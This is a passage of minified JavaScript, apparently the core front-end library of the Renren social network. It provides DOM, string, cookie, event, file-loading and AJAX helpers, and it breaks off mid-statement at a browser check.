try{
document.domain=""+XN.env.domain+"";
}
catch(e){
try{
XN={env:{shortSiteName:"\u4eba\u4eba",siteName:"\u4eba\u4eba\u7f51",domain:window.location.hostname.split(".").reverse().slice(0,2).reverse().join(".")}};
document.domain=XN.env.domain;
}
catch(e){
}
}
function isUndefined(_1){
return typeof _1=="undefined";
}
function isString(_2){
return typeof _2=="string";
}
function isElement(_3){
return _3&&_3.nodeType==1;
}
function isFunction(_4){
return typeof _4=="function";
}
function isObject(_5){
return typeof _5=="object";
}
function isArray(_6){
return Object.prototype.toString.call(_6)==="[object Array]";
}
function isNumber(_7){
return typeof _7=="number";
}
function $extend(_8,_9){
if(!_9){
return _8;
}
for(var p in _9){
_8[p]=_9[p];
}
return _8;
}
(function(){
var _b={};
$element=function(_c){
_c=_c.toLowerCase();
if(!_b[_c]){
_b[_c]=document.createElement(_c);
}
return $(_b[_c].cloneNode(false));
};
})();
function $(id){
var el;
if(isString(id)||isNumber(id)){
el=document.getElementById(id+"");
}else{
el=id;
}
if(!el){
return null;
}
if(!el._extendLevel){
XN.element.extend(el);
}
return el;
}
xn_getEl=$;
if(!Function.prototype.bind){
Function.prototype.bind=function(_f){
var _10=this;
return function(){
_10.apply(_f,arguments);
};
};
}
ge=getEl=$;
$xElement=$element;
$X=$;
if(typeof XN=="undefined"){
XN={};
}
$extend(XN,{namespace:function(){
var a=arguments,o=null,i,j,d;
for(i=0;i<a.length;i++){
d=a[i].split(".");
o=XN;
for(j=(d[0]=="XN")?1:0;j<d.length;j++){
o[d[j]]=o[d[j]]||{};
o=o[d[j]];
}
}
return o;
}});
XN.namespace("ui");
XN.namespace("util");
XN.namespace("app");
XN.namespace("page");
XN.namespace("config");
XN.APP=XN.App=XN.app;
XN.PAGE=XN.Page=XN.page;
XN.CONFIG=XN.Config=XN.config;
XN.DEBUG_MODE=false;
XN.debug={log:function(){
},on:function(){
XN.DEBUG_MODE=true;
if(window.console&&console.log){
XN.debug.log=function(s){
console.log(s);
};
}
},off:function(){
XN.debug.log=function(){
};
}};
XN.log=function(s){
XN.debug.log(s);
};
XN.DEBUG=XN.Debug=XN.debug;
XN.debug.On=XN.debug.on;
XN.debug.Off=XN.debug.off;
XN.namespace("env");
$extend(XN.env,{domain_reg:XN.env.domain.replace(/\./g,"\\."),staticRoot:"http://s.xnimg.cn/",CDNstaticRoot:"http://xnimg.cn/",swfRoot:"http://static.xiaonei.com/",wwwRoot:"http://"+XN.env.domain+"/"});
XN.ENV=XN.Env=XN.env;
XN.array={toQueryString:function(a,key){
var rt=[],t;
for(var k in a){
t=a[k];
if(isFunction(t)){
continue;
}
if(isObject(t)){
rt.push(arguments.callee(t,k));
}else{
if(/^\d+$/.test(k)){
rt.push((key||k)+"="+encodeURIComponent(t));
}else{
rt.push(k+"="+encodeURIComponent(t));
}
}
}
return rt.join("&");
},each:function(a,_1e){
if(!a){
return;
}
if(!isUndefined(a.length)||!isUndefined(a[0])){
for(var i=0,j=a.length;i<j;i++){
if(_1e.call(a,i,a[i])===false){
break;
}
}
}else{
for(var key in a){
if(!isFunction(a[key])){
if(_1e.call(a,key,a[key])===false){
break;
}
}
}
}
},include:function(a,_23){
var r=false;
XN.array.each(a,function(i,v){
if(v===_23){
r=true;
return false;
}
});
return r;
},build:function(o){
var rt=[];
for(var i=0,j=o.length;i<j;i++){
rt.push(o[i]);
}
return rt;
}};
XN.ARRAY=XN.Array=XN.array;
XN.string={nl2br:function(str){
return str.replace(/([^>])\n/g,"$1<br />");
},trim:function(str){
return str.replace(/^\s+|\s+$/g,"");
},ltrim:function(str){
return str.replace(/^\s+/,"");
},rtrim:function(str){
return str.replace(/\s+$/,"");
},strip:function(str){
return XN.string.trim(str);
},stripTags:function(str){
return str.replace(/<\/?[^>]+>/igm,"");
},escapeHTML:function(str){
return str.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
},unescapeHTML:function(str){
return str.replace(/&lt;/g,"<").replace(/&gt;/g,">").replace(/&nbsp;/g," ").replace(/&quot;/g,"\"").replace(/&amp;/g,"&");
},include:function(str,key){
return str.indexOf(key)>-1;
},startsWith:function(str,key){
return str.indexOf(key)===0;
},endsWith:function(str,key){
var d=str.length-key.length;
return d>=0&&str.lastIndexOf(key)===d;
},isBlank:function(str){
return /^\s*$/.test(str);
},isEmail:function(str){
return /^[A-Z_a-z0-9-\.]+@([A-Z_a-z0-9-]+\.)+[a-z0-9A-Z]{2,4}$/.test(str);
},isMobile:function(str){
return /^((\(\d{2,3}\))|(\d{3}\-))?((1[345]\d{9})|(18\d{9}))$/.test(str);
},isUrl:function(str){
return /^(http:|ftp:)\/\/[A-Za-z0-9]+\.[A-Za-z0-9]+[\/=\?%\-&_~`@[\]\':+!]*([^<>\"])*$/.test(str);
},isIp:function(str){
return /^(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5]).(0|[1-9]\d?|[0-1]\d{2}|2[0-4]\d|25[0-5])$/.test(str);
},isNumber:function(str){
return /^\d+$/.test(str);
},isZip:function(str){
return /^[1-9]\d{5}$/.test(str);
},isEN:function(str){
return /^[A-Za-z]+$/.test(str);
},isJSON:function(str){
if(!isString(str)||str===""){
return false;
}
str=str.replace(/\\./g,"@").replace(/"[^"\\\n\r]*"/g,"");
return (/^[,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]*$/).test(str);
},getQuery:function(key,url){
url=url||window.location.href+"";
if(url.indexOf("#")!==-1){
url=url.substring(0,url.indexOf("#"));
}
var rts=[],rt;
var _47=new RegExp("(^|\\?|&)"+key+"=([^&]*)(?=&|#|$)","g");
while((rt=_47.exec(url))!=null){
rts.push(decodeURIComponent(rt[2]));
}
if(rts.length==0){
return null;
}
if(rts.length==1){
return rts[0];
}
return rts;
},setQuery:function(key,_49,url){
url=url||window.location.href+"";
var _4b="";
if(!/^http/.test(url)){
return url;
}
if(url.indexOf("#")!==-1){
_4b=url.substring(url.indexOf("#"));
}
url=url.replace(_4b,"");
url=url.replace(new RegExp("(^|\\?|&)"+key+"=[^&]*(?=&|#|$)","g"),"");
_49=isArray(_49)?_49:[_49];
for(var i=_49.length-1;i>=0;i--){
_49[i]=encodeURIComponent(_49[i]);
}
var p=key+"="+_49.join("&"+key+"=");
return url+(/\?/.test(url)?"&":"?")+p+_4b;
}};
XN.String=XN.STRING=XN.string;
XN.string.isNum=XN.string.isNumber;
window.isJSON=XN.string.isJSON;
(function(){
runOnceFunc={};
XN.func={empty:function(){
},runOnce:function(_4e){
if(runOnceFunc[_4e]){
return null;
}
runOnceFunc[_4e]=true;
return _4e();
}};
})();
XN.FUNC=XN.Func=XN.func;
(function(){
XN.browser={IE:!!(window.attachEvent&&!window.opera),IE6:navigator.userAgent.indexOf("MSIE 6.0")>-1,IE7:navigator.userAgent.indexOf("MSIE 7.0")>-1,IE8:navigator.userAgent.indexOf("MSIE 8.0")>-1,Opera:!!window.opera,WebKit:navigator.userAgent.indexOf("AppleWebKit/")>-1,Gecko:navigator.userAgent.indexOf("Gecko")>-1&&navigator.userAgent.indexOf("KHTML")==-1,copy:function(o){
function onfail(){
if(isElement(o)){
o.select();
}
}
var str;
if(isElement(o)){
str=o.value;
}else{
str=o;
}
if(window.clipboardData&&clipboardData.setData){
if(clipboardData.setData("text",str)){
return true;
}
}else{
XN.DO.alert({message:"\u60a8\u7684\u6d4f\u89c8\u5668\u4e0d\u652f\u6301\u811a\u672c\u590d\u5236,\u8bf7\u5c1d\u8bd5\u624b\u52a8\u590d\u5236",callBack:function(){
onfail();
}});
return false;
}
XN.DO.alert({message:"\u60a8\u7684\u6d4f\u89c8\u5668\u8bbe\u7f6e\u4e0d\u5141\u8bb8\u811a\u672c\u8bbf\u95ee\u526a\u5207\u677f",callBack:function(){
onfail();
}});
return false;
}};
})();
XN.BROWSER=XN.Browser=XN.browser;
XN.cookie={get:function(_51){
var _52=_51+"=";
var ca=document.cookie.split(";");
for(var i=0;i<ca.length;i++){
var c=ca[i];
while(c.charAt(0)==" "){
c=c.substring(1,c.length);
}
if(c.indexOf(_52)==0){
return decodeURIComponent(c.substring(_52.length,c.length));
}
}
return null;
},set:function(_56,_57,_58,_59,_5a,_5b){
var _5c;
if(isNumber(_58)){
var _5d=new Date();
_5d.setTime(_5d.getTime()+(_58*24*60*60*1000));
_5c=_5d.toGMTString();
}else{
if(isString(_58)){
_5c=_58;
}else{
_5c=false;
}
}
document.cookie=_56+"="+encodeURIComponent(_57)+(_5c?";expires="+_5c:"")+(_59?";path="+_59:"")+(_5a?";domain="+_5a:"")+(_5b?";secure":"");
},del:function(_5e,_5f,_60,_61){
XN.cookie.set(_5e,"",-1,_5f,_60,_61);
}};
XN.COOKIE=XN.Cookie=XN.cookie;
(function(){
var _62=XN.browser;
XN.event={isCapsLockOn:function(e){
var c=e.keyCode||e.which;
var s=e.shiftKey;
if(((c>=65&&c<=90)&&!s)||((c>=97&&c<=122)&&s)){
return true;
}
return false;
},element:function(e){
var n=e.target||e.srcElement;
return _68.resolveTextNode(n);
},relatedTarget:function(e){
var t=e.relatedTarget;
if(!t){
if(e.type=="mouseout"||e.type=="mouseleave"){
t=e.toElement;
}else{
if(e.type=="mouseover"){
t=e.fromElement;
}
}
}
return _68.resolveTextNode(t);
},resolveTextNode:function(n){
try{
if(n&&3==n.nodeType){
return n.parentNode;
}
}
catch(e){
}
return n;
},pointerX:function(_6c){
return _6c.pageX||(_6c.clientX+(document.documentElement.scrollLeft||document.body.scrollLeft));
},pointerY:function(_6d){
return _6d.pageY||(_6d.clientY+(document.documentElement.scrollTop||document.body.scrollTop));
},isStrictMode:document.compatMode!="BackCompat",pageHeight:function(){
return this.isStrictMode?Math.max(document.documentElement.scrollHeight,document.documentElement.clientHeight):Math.max(document.body.scrollHeight,document.body.clientHeight);
},pageWidth:function(){
return this.isStrictMode?Math.max(document.documentElement.scrollWidth,document.documentElement.clientWidth):Math.max(document.body.scrollWidth,document.body.clientWidth);
},winWidth:function(){
return this.isStrictMode?document.documentElement.clientWidth:document.body.clientWidth;
},winHeight:function(){
return this.isStrictMode?document.documentElement.clientHeight:document.body.clientHeight;
},scrollTop:function(){
if(XN.browser.WebKit){
return window.pageYOffset;
}
return this.isStrictMode?document.documentElement.scrollTop:document.body.scrollTop;
},scrollLeft:function(){
if(XN.browser.WebKit){
return window.pageXOffset;
}
return this.isStrictMode?document.documentElement.scrollLeft:document.body.scrollLeft;
},stop:null,addEvent:function(el,_6f,_70,cap){
var els=[];
el=$(el);
if(isArray(el)){
els=el;
}else{
els.push(el);
}
if(els.length==0){
return el;
}
XN.array.each(els,function(i,v){
XN.event._addEvent(v,_6f,_70,cap);
});
return el;
},delEvent:function(el,_76,_77,cap){
var els=[];
el=$(el);
if(isArray(el)){
els=el;
}else{
els.push(el);
}
if(els.length==0){
return el;
}
XN.array.each(els,function(i,v){
XN.event._delEvent(v,_76,_77,cap);
});
return el;
},_addEvent:null,_delEvent:null,enableCustomEvent:function(obj){
$extend(obj,{addEvent:function(_7d,_7e){
if(!this._customEventListeners){
this._customEventListeners={};
}
var _7f=this._customEventListeners;
if(isUndefined(_7f[_7d])){
_7f[_7d]=[];
}
_7f[_7d].push(_7e);
return this;
},delEvent:function(_80,_81){
var _82=this._customEventListeners[_80];
if(_82){
for(var i=_82.length-1;i>=0;i--){
if(_82[i]==_81){
_82[i]=null;
break;
}
}
}
return this;
},fireEvent:function(_84){
if(!this._customEventListeners||!this._customEventListeners[_84]){
return;
}
var _85=this._customEventListeners[_84],ars=XN.array.build(arguments);
ars.shift();
for(var i=0,j=_85.length;i<j;i++){
if(_85[i]){
try{
_85[i].apply(this,ars);
}
catch(ox){
if(XN.DEBUG_MODE){
throw ox;
}
}
}
}
}});
return obj;
}};
var _68=XN.event;
if(_62.IE){
_68.stop=function(_89){
_89.returnValue=false;
_89.cancelBubble=true;
};
}else{
_68.stop=function(_8a){
_8a.preventDefault();
_8a.stopPropagation();
};
}
var _8b=function(_8c,_8d){
var p=_8c.relatedTarget;
while(p&&p!=_8d){
try{
p=p.parentNode;
}
catch(error){
p=_8d;
}
}
return p!==_8d;
};
if(window.attachEvent&&!_62.Opera){
_68._addEvent=function(_8f,_90,_91){
_8f=$(_8f);
if(_90=="keypress"){
_90="keydown";
}
if(_90=="input"){
_90="propertychange";
}
_8f.attachEvent("on"+_90,_91);
return _8f;
};
_68._delEvent=function(_92,_93,_94){
_92=$(_92);
if(_93=="keypress"){
_93="keydown";
}
if(_93=="input"){
_93="propertychange";
}
_92.detachEvent("on"+_93,_94);
return _92;
};
}else{
if(window.addEventListener){
_68._addEvent=function(_95,_96,_97,_98){
_95=$(_95);
if(_96=="mouseleave"){
_95.onmouseleave=function(e){
e=e||window.event;
if(_8b(e,_95)&&_97){
_97.call(_95,e);
}
};
_95.addEventListener("mouseout",_95.onmouseleave,_98);
return _95;
}
if(_96=="keypress"&&_62.WebKit){
_96="keydown";
}
_95.addEventListener(_96,_97,_98);
return _95;
};
_68._delEvent=function(_9a,_9b,_9c,_9d){
_9a=$(_9a);
if(_9b=="mouseleave"){
_9a.removeEventListener("mouseout",_9a.onmouseleave,_9d);
return _9a;
}
if(_9b=="keypress"&&_62.WebKit){
_9b="keydown";
}
_9a.removeEventListener(_9b,_9c,_9d);
return _9a;
};
}
}
})();
XN.EVENT=XN.Event=XN.event;
(function(){
var _9e=XN.event;
var _9f=XN.array;
var _a0=XN.browser;
var _a1=false;
var _a2=[];
var _a3=[];
function runHooks(){
if(!_a2){
return;
}
XN.array.each(_a2,function(i,v){
try{
v();
}
catch(e){
if(XN.DEBUG_MODE){
throw e;
}
}
});
XN.array.each(_a3,function(i,v){
setTimeout(v,0);
});
}
var _a8=null;
function createShadow(_a9,_aa){
_a9=_a9||0.3;
_aa=_aa||2000;
var el=$element("div");
_a8=el;
XN.element.setStyle(el,["position:absolute;","top:0;","left:0;","background:#000;","z-index:"+_aa+";","opacity:"+_a9+";","filter:alpha(opacity="+(_a9*100)+");"].join(""));
el.innerHTML=["<iframe width=\"100%\" height=\"100%\" frameBorder=\"0\" style=\"position:absolute;top:0;left:0;z-index:1;\"></iframe>","<div style=\"position:absolute;top:0;left:0;width:100%;height:100%;background-color:#000000;z-index:2;height:expression(this.parentNode.offsetHeight);\"></div>"].join("");
function resize(){
el.hide();
el.style.height=XN.event.pageHeight()+"px";
el.style.width=XN.event.pageWidth()+"px";
el.show();
}
resize();
XN.event.addEvent(window,"resize",function(e){
if(_a8&&_a8.style.display!="none"){
try{
resize();
}
catch(e){
}
}
});
document.body.appendChild(el);
}
XN.dom={disable:function(_ad,_ae){
if(!_a8){
createShadow(_ad,_ae);
}
},enable:function(){
if(_a8){
_a8.remove();
_a8=null;
}
},insertAfter:function(_af,_b0){
_af=$(_af);
_b0=$(_b0);
var _b1=_b0.parentNode;
if(_b1.lastChild==_b0){
_b1.appendChild(_af);
}else{
_b1.insertBefore(_af,_b0.nextSibling);
}
},getElementsByClassName:function(_b2,_b3,_b4){
var c=($(_b3)||document).getElementsByTagName(_b4||"*")||document.all;
var _b6=[];
var _b7=new RegExp("(^|\\s)"+_b2+"(\\s|$)");
_9f.each(c,function(i,v){
if(_b7.test(v.className)){
_b6.push(v);
}
});
return _b6;
},ready:function(f,_bb){
if(isUndefined(_bb)){
_bb=false;
}
if(_a1){
_bb?setTimeout(f,0):f();
}else{
_bb?_a3.push(f):_a2.push(f);
}
},preloadImg:function(src){
src=isArray(src)?src:[src];
_9f.each(src,function(i,v){
new Image().src=v;
});
}};
if(_a0.WebKit){
var _bf=setInterval(function(){
if(/loaded|complete/.test(document.readyState)){
_a1=true;
runHooks();
clearInterval(_bf);
}
},10);
}else{
if(document.addEventListener){
document.addEventListener("DOMContentLoaded",function(){
_a1=true;
runHooks();
},false);
}else{
var _bf=setInterval(function(){
try{
document.body.doScroll("left");
clearInterval(_bf);
_a1=true;
runHooks();
}
catch(e){
}
},20);
}
}
})();
XN.DOM=XN.Dom=XN.dom;
XN.dom.readyDo=XN.dom.ready;
XN.dom.ready(function(){
$=ge=getEl=xn_getEl;
});
XN.namespace("config");
XN.config.jumpOut=true;
XN.dom.ready(function(){
if(XN.config.parentDomain||(!XN.config.jumpOut)){
return;
}
try{
top.location.href.indexOf("x");
}
catch(e){
try{
top.location=self.location;
}
catch(e){
}
}
});
(function(){
var _c0={};
var _c1={};
function hasLoad(_c2){
return !!getFile(_c2);
}
function getFile(_c3){
return _c0[encodeURIComponent(_c3)];
}
function mark(_c4){
var obj={};
obj.file=_c4;
obj.isLoad=true;
obj.isLoaded=true;
_c0[encodeURIComponent(_c4)]=obj;
}
function addFile(_c6){
var obj={};
obj.file=_c6;
obj.isLoaded=false;
XN.EVENT.enableCustomEvent(obj);
obj.addEvent("load",function(){
this.isLoaded=true;
});
_c0[encodeURIComponent(_c6)]=obj;
var el=$element("script");
el.type="text/javascript";
el.src=_c6;
obj.element=el;
if(XN.Browser.IE){
el.onreadystatechange=function(){
if((this.readyState=="loaded"||this.readyState=="complete")&&!this.hasLoad){
this.hasLoad=true;
getFile(_c6).fireEvent("load");
}
};
}else{
el.onload=function(){
getFile(_c6).fireEvent("load");
};
}
document.getElementsByTagName("head")[0].appendChild(el);
}
function loadFile(_c9,_ca){
var _cb=false,_cc=false;
if(isObject(_c9)){
_cb=(_c9.type=="js");
_cc=(_c9.type=="css");
_c9=_c9.file;
}
_c9=getFullName(_c9);
if(/\.js(\?|$)/.test(_c9)||_cb){
if(!hasLoad(_c9)){
addFile(_c9);
}
if(!_ca){
return;
}
if(getFile(_c9).isLoaded){
_ca.call(getFile(_c9));
}else{
getFile(_c9).addEvent("load",_ca);
}
}else{
if(/\.css(\?|$)/.test(_c9)||_cc){
if(hasLoad(_c9)){
if(_ca){
_ca.call(getFile(_c9));
}
return;
}
mark(_c9);
var el=$element("link");
el.rel="stylesheet";
el.type="text/css";
el.href=_c9;
document.getElementsByTagName("head")[0].appendChild(el);
if(_ca){
_ca.call(getFile(_c9));
}
}
}
}
function getFullName(_ce){
XN.func.runOnce(loadVersion);
if(!_c1[_ce]){
return _ce;
}
return _c1[_ce].file;
}
function getVersion(_cf){
var _d0;
if(_d0=new RegExp("("+XN.env.staticRoot+")"+"(a?\\d+)/([^?]*)").exec(_cf)){
_c1[_d0[1]+_d0[3]]={file:_cf,version:_d0[2]};
}else{
if(_d0=new RegExp("(.*)\\?ver=(d+)(..*)").exec(_cf)){
_c1[_d0[1]]={file:_cf,version:_d0[2]};
}
}
}
XN.getFileVersion=function(_d1){
XN.array.each(_d1,function(i,v){
getVersion(v);
});
};
XN.loadFile=function(_d4,_d5){
loadFile(_d4,_d5);
};
XN.loadFiles=function(_d6,_d7){
var f=_d6.length;
function isAllLoad(){
f--;
if(f===0&&_d7){
_d7();
}
}
XN.array.each(_d6,function(i,v){
XN.loadFile(v,isAllLoad);
});
};
XN.getVersion=function(_db){
getVersion(_db);
};
function loadVersion(){
XN.array.each(document.getElementsByTagName("script"),function(i,v){
if(v.src){
mark(v.src);
getVersion(v.src);
}
if(v.getAttribute("vsrc")){
getVersion(v.getAttribute("vsrc"));
}
});
XN.array.each(document.getElementsByTagName("link"),function(i,v){
if(v.rel&&v.rel=="stylesheet"){
mark(v.href);
getVersion(v.href);
}
if(v.getAttribute("vhref")){
getVersion(v.getAttribute("vhref"));
}
});
XN.log("load file version:");
XN.log(_c1);
}
XN.dynamicLoad=function(_e0){
XN.array.each(_e0.funcs,function(i,_e2){
window[_e2]=function(){
var ars=arguments;
window[_e2]=null;
if(_e0.file){
_e0.files=[_e0.file];
}
XN.loadFiles(_e0.files,function(){
window[_e2].apply(null,ars);
if(_e0.callBack){
_e0.callBack.call(null);
}
});
};
});
};
XN.namespace("img");
XN.img.getVersion=function(_e4){
XN.func.runOnce(loadVersion);
if(!_c1[_e4]){
return "";
}
return _c1[_e4].version;
};
XN.img.getFullName=function(_e5){
return getFullName(_e5);
};
})();
(function(){
var _e6=XN.event.addEvent;
var _e7=XN.event.delEvent;
var _e8=XN.browser;
XN.element={clear:function(_e9){
_e9=$(_e9);
_e9.innerHTML="";
return _e9;
},hover:function(_ea,_eb,_ec){
_ea=$(_ea);
_ec=_ec?$(_ec):_ea;
_e6(_ea,"mouseover",function(){
_ec.addClass(_eb);
},false);
_e6(_ea,"mouseleave",function(){
_ec.delClass(_eb);
},false);
return _ea;
},scrollTo:function(_ed,_ee){
_ed=$(_ed);
_ee=_ee||"normal";
switch(_ee){
case "slow":
XN.EFFECT.scrollTo(_ed);
break;
default:
window.scrollTo(0,_ed.realTop());
break;
}
return _ed;
},visible:function(_ef){
_ef=$(_ef);
return _ef.style.display!="none"&&_ef.style.visibility!="hidden";
},toggleClass:function(_f0,_f1,_f2){
if(isUndefined(_f2)){
if(_f3.hasClassName(_f0,_f1)){
_f3.delClass(_f0,_f1);
}else{
_f3.addClass(_f0,_f1);
}
}else{
if(_f3.hasClassName(_f0,_f1)){
_f3.delClass(_f0,_f1);
_f3.addClass(_f0,_f2);
}else{
_f3.addClass(_f0,_f1);
_f3.delClass(_f0,_f2);
}
}
return $(_f0);
},toggleText:function(_f4,_f5,_f6){
if(_f4.innerHTML==_f5){
_f4.innerHTML=_f6;
}else{
_f4.innerHTML=_f5;
}
},hasClassName:function(_f7,_f8){
return new RegExp("(^|\\s+)"+_f8+"(\\s+|$)").test($(_f7).className);
},addClass:function(_f9,_fa){
_f9=$(_f9);
if(_f3.hasClassName(_f9,_fa)){
return _f9;
}
_f9.className+=" "+_fa;
return _f9;
},delClass:function(_fb,_fc){
_fb=$(_fb);
_fb.className=_fb.className.replace(new RegExp("(^|\\s+)"+_fc+"(\\s+|$)","g")," ");
return _fb;
},show:function(_fd,_fe){
_fd=$(_fd);
if(_fd.style.display!="none"){
return;
}
_fe=_fe||"normal";
switch(_fe){
case "normal":
_fd.style.display="";
break;
case "fade":
XN.EFFECT.fadeIn(_fd,function(e){
e.style.display="";
});
break;
case "slide":
XN.EFFECT.slideOpen(_fd);
break;
case "delay":
setTimeout(function(){
_fd.style.display="";
},2000);
break;
}
return _fd;
},hide:function(_100,_101){
_100=$(_100);
if(_100.style.display=="none"){
return;
}
_101=_101||"normal";
switch(_101){
case "normal":
_100.style.display="none";
break;
case "fade":
XN.EFFECT.fadeOut(_100,function(e){
e.style.display="none";
});
break;
case "slide":
XN.EFFECT.slideClose(_100);
break;
case "delay":
setTimeout(function(){
_100.style.display="none";
},2000);
break;
}
return _100;
},remove:function(_103){
var _103=$(_103);
_103.parentNode.removeChild(_103);
return _103;
},setStyle:function(_104,_105){
var _104=$(_104);
_104.style.cssText+=";"+_105;
return _104;
},getStyle:function(_106,_107){
_106=$(_106);
_107=_107=="float"?"cssFloat":_107;
var _108=_106.style[_107];
if(!_108){
var css=document.defaultView.getComputedStyle(_106,null);
_108=css?css[_107]:null;
}
if(_107=="opacity"){
return _108?parseFloat(_108):1;
}
return _108=="auto"?null:_108;
},addEvent:function(){
_e6.apply(null,arguments);
return arguments[0];
},delEvent:function(){
_e7.apply(null,arguments);
return arguments[0];
},addChild:function(_10a,_10b){
_10a=$(_10a);
if(isString(_10b)){
var _10c=(_10b.substring(0,1)=="#")?$(_10b.substring(1,_10b.length)):_10b;
if(isString(_10c)){
_10a.innerHTML+=_10c;
}else{
_10a.appendChild(_10c);
}
}else{
if(isElement(_10b)){
_10a.appendChild(_10b);
}else{
if(_10b.iAmUIelement){
_10a.appendChild($(_10b.frame));
}else{
if(_10b.iAmXmlhttp){
_10b.fillTo=_10a;
_10a.startLoading();
}
}
}
}
return _10a;
},delChild:function(_10d,_10e){
_10e=$(_10e);
_10e.remove();
return $(_10d);
},setContent:function(_10f,c){
_10f=$(_10f);
_10f.innerHTML="";
_10f.addChild(c);
return _10f;
},getPosition:function(_111,_112){
_112=$(_112)||document.body;
_111=$(_111);
var rl=0;
var rt=0;
var p=_111;
try{
while(p&&p!=_112){
rl+=p.offsetLeft;
rt+=p.offsetTop;
p=p.offsetParent;
}
}
catch(e){
}
return {"left":rl,"top":rt};
},realLeft:function(_116,p){
return _f3.getPosition(_116,p||null).left;
},realTop:function(_118,p){
return _f3.getPosition(_118,p||null).top;
},appendHTML:function(_11a,str,_11c){
_11a=$(_11a);
var f=document.createDocumentFragment();
var t=$element("div");
t.innerHTML=str;
while(t.firstChild){
f.appendChild(t.firstChild);
}
var tmp=XN.array.build(f.childNodes);
_11a.appendChild(f);
if(_11c){
return tmp;
}
return _11a;
},findFirstClass:function(_120,_121){
_120=$(_120);
var els=XN.dom.getElementsByClassName(_121,_120);
return $(els[0])||null;
},startLoading:function(_123,msg){
_123=$(_123);
_123.innerHTML="<center><img src=\""+XN.ENV.staticRoot+"img/indicator.gif\" />"+(msg||"\u52a0\u8f7d\u4e2d...")+"</center>";
return _123;
},stopLoading:function(_125){
_125=$(_125);
return _125;
},eval_inner_JS:function(el){
var js=$(el).getElementsByTagName("script");
XN.array.each(js,function(i,s){
if(s.src){
XN.loadFile(s.src);
}else{
var _12a="__inner_js_out_put = [];\n";
_12a+=s.innerHTML.replace(/document\.write/g,"__inner_js_out_put.push");
eval(_12a);
if(__inner_js_out_put.length!==0){
var tmp=document.createDocumentFragment();
$(tmp).appendHTML(__inner_js_out_put.join(""));
s.parentNode.insertBefore(tmp,s);
}
}
});
}};
XN.element.extend=function(_12c){
if(_12c._extendLevel){
return _12c;
}
var _12d=_f3.extend.cache;
for(var m in _f3){
if(!(m in _12c)){
_12c[m]=_12d.findOrStore(_f3[m]);
}
}
return _12c;
};
XN.element.extend.cache={findOrStore:function(_12f){
return this[_12f]=this[_12f]||function(){
return _12f.apply(null,[this].concat(XN.array.build(arguments)));
};
}};
var _f3=XN.element;
if(_e8.IE){
XN.element.getStyle=function(_130,_131){
_130=$(_130);
_131=(_131=="float"||_131=="cssFloat")?"styleFloat":_131;
var _132=_130.style[_131];
if(!_132&&_130.currentStyle){
_132=_130.currentStyle[_131];
}
if(_131=="opacity"){
if(_132=(_130.getStyle("filter")||"").match(/alpha\(opacity=(.*)\)/)){
if(_132[1]){
return parseFloat(_132[1])/100;
}
}
return 1;
}
if(_132=="auto"){
if((_131=="width"||_131=="height")&&(_130.getStyle("display")!="none")){
return _130["offset"+(_131=="width"?"Width":"Height")]+"px";
}
return null;
}
return _132;
};
}
if(document.addEventListener){
XN.element.setOpacity=function(_133,_134){
_133=$(_133);
_133.style.opacity=_134;
return _133;
};
}else{
XN.element.setOpacity=function(_135,_136){
_135=$(_135);
_135.style.zoom=1;
_135.style.filter="Alpha(opacity="+Math.ceil(_136*100)+")";
return _135;
};
}
})();
XN.ELEMENT=XN.Element=XN.element;
XN.namespace("net");
XN.net.proxys={};
XN.net.sendForm=function(_137){
XN.log("send form");
_137.data=XN.FORM.serialize(_137.form);
return new XN.net.xmlhttp(_137);
};
XN.net.xmlhttp=function(_138){
var This=this;
if(!XN.net.cache){
XN.net.cache=new XN.util.cache();
}
var ars=arguments;
if(ars.length>1){
this.url=ars[0]||null;
this.data=ars[1]||"";
this.onSuccess=ars[2];
$extend(this,ars[3]);
init(window);
return this;
}
$extend(this,_138);
var _13b;
if(this.useCache&&(_13b=XN.net.cache.get(this.url+encodeURIComponent(this.data)))){
this.transport={};
this.transport.responseText=_13b;
setTimeout(function(){
This._onComplete();
This._onSuccess();
},0);
return this;
}
function getDomain(link){
var a=$element("a");
a.href=link;
return a.hostname;
}
if(/^http/.test(this.url)){
var cd=getDomain(window.location.href);
var nd=getDomain(this.url);
if(cd!=nd){
if(XN.net.proxys[nd]){
init(XN.net.proxys[nd]);
return This;
}else{
var _140=$element("iframe").hide();
document.body.appendChild(_140);
_140.src="http://"+nd+"/ajaxproxy.htm";
XN.event.addEvent(_140,"load",function(){
try{
init(_140.contentWindow);
XN.net.proxys[nd]=_140.contentWindow;
}
catch(e){
}
});
return This;
}
}else{
init(window);
}
}else{
init(window);
}
function init(w){
This.transport=This.getTransport(w);
if(This.url&&This.url!==""){
This.send(This.method);
}
}
};
XN.net.xmlhttp.prototype={url:null,data:"",onSuccess:null,onFailure:null,onError:null,fillTo:null,method:"post",asynchronous:true,transport:null,headers:null,iAmXmlhttp:true,useCache:false,abort:function(){
this.transport.abort();
},send:function(_142){
var _url;
if(_142=="get"&&this.data!==""){
_url=this.url+(/\?/.test(this.url)?"&":"?")+this.data;
}else{
_url=this.url;
}
if(this.asynchronous){
this.transport.onreadystatechange=this.onStateChange.bind(this);
}
this.transport.open(_142,_url,this.asynchronous);
this.transport.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
if(this.headers!==null){
for(var i in this.headers){
this.transport.setRequestHeader(i,this.headers[i]);
}
}
this.transport.send(_142=="post"?(this.data||""):null);
if(!this.asynchronous){
this._onComplete();
}
},_onSuccess:function(obj){
var _146=this.transport;
if(this.fillTo!==null){
try{
this.fillTo.stopLoading();
}
catch(e){
}
this.fillTo.innerHTML=_146.responseText;
}
try{
if(this.onSuccess){
this.onSuccess.call(null,_146);
}
}
catch(e){
if(XN.DEBUG_MODE){
throw e;
}
}
},_onComplete:function(obj){
var _148=this.transport;
try{
if(this.onComplete){
this.onComplete.call(null,_148);
}
}
catch(e){
if(XN.DEBUG_MODE){
throw e;
}
}
},onStateChange:function(){
var _149=this.transport;
if(_149.readyState==4){
this._onComplete();
if(_149.status==undefined||_149.status==0||(_149.status>=200&&_149.status<300)){
if(this.useCache){
XN.net.cache.add(this.url+encodeURIComponent(this.data),this.transport.responseText);
}
this._onSuccess();
}else{
(this.onError||this.onFailure||XN.func.empty).call(null,_149);
}
}
}};
if(XN.browser.IE){
